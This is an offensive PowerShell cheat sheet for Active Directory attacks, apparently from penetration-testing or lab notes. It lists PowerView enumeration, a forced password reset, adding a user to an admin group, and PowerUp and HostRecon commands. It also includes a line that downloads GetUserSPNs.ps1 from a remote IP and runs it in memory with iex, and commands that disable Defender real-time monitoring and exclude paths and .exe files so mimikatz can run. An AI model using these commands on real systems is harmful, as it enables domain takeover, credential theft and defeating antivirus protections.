# Cheat Sheet - PowerShell Scripts

## Table of content :

* [Powerview](#PowerView)
* [PowerUp](#PowerUp)
* [HostRecon](#Recon)
* [GetUsersSPNs](#GUS)
* [Disable AV and Exclude Mimikatz](#DisableAV)

### Powerview<a name="PowerView"></a>

```PowerShell
Get-DomainComputer -Unconstrained
Get-DomainUser -Domain sinhack.com
Get-DomainUser -Identity v0lk3n
Get-DomainTrust -API
Get-DomainForeignGroupMember -Domain dev.sinhack.com
ConvertFrom-SID S-1-5-21-1416213050-106196312-571527550-1107

#Parsing in Objectacl
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

# Change User Password Account using PowerView
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity V0lk3n -AccountPassword $UserPassword

# Add users to AD Groups
Add-DomainGroupMember -Identity 'ADMINS' -Members 'v0lk3n' -Rights all
```

### PowerUp<a name="PowerUp"></a>

```bash
Invoke-AllChecks
```

### HostRecon<a name="Recon"></a>

```PowerShell
Invoke-HostRecon
```

### GetUserSPNs<a name="GUS"></a>

```PowerShell
(new-object system.net.webclient).downloadstring('http://192.168.49.112:8080/GetUserSPNs.ps1') | iex
```

### Disable AV and Exclude Mimikatz<a name="DisableAV"></a>

1. Disable AV

```PowerShell
Set-MpPreference -DisableRealTimeMonitoring $true
```

2. Add two rules to exclude mimikatz. One for exclude Desktop path, another to exclude "exe" extensions.

```powershell
Set-MpPreference -ExclusionPath \Users\Administrator\Desktop
Set-MpPreference -ExclusionExtension exe
```
